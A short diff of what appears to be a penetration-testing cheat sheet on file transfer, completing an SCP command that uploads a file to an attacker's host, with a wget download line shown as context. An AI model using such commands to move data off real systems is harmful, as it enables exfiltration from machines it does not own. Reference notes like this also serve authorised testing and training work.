@@ -144,7 +144,7 @@ wget <IP>:<PORT>/<FILE TO TRANSFER>
 ---
 ## Uploading File with SCP
 ```bash
-scp <PATH TO FILE> 
+scp <PATH TO FILE> <ATTACKER USER>:<ATTACKER IP>:<PATH TO SAVE FILE>
 ```
 
 
